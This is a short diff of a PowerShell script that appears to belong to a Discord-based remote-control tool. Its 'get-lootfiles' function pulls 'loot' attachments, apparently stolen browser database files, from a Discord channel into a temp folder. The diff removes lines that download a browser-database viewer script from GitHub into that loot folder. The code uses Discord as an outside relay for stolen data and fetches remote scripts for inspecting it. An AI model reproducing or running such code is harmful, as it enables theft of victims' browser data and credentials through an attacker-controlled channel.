@@ -483,9 +483,6 @@ function get-lootfiles {
     $messages1 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID/messages")
     $messages1 = $messages1 | ConvertFrom-Json
     
-    $viewer = 'https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Information%20Enumeration/Browser-DB-File-Viewer.ps1'
-    $viewPath = Join-Path -Path $lootPath -ChildPath 'DB-View.ps1'
-    $wc.DownloadFile($viewer, $viewPath)
     foreach ($message in $messages1) {
 
         foreach ($attachment in $message.attachments) {
@@ -505,7 +502,6 @@ function get-lootfiles {
 $lootfolder = "$env:temp\loot"
 New-Item -Path $lootfolder -ItemType Directory -Force
 get-lootfiles -ID $ID5 -lootPath $lootfolder
-iwr -Uri https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Information%20Enumeration/Browser-DB-File-Viewer.ps1
 
 # ============================ LOOP SETUP =============================
 
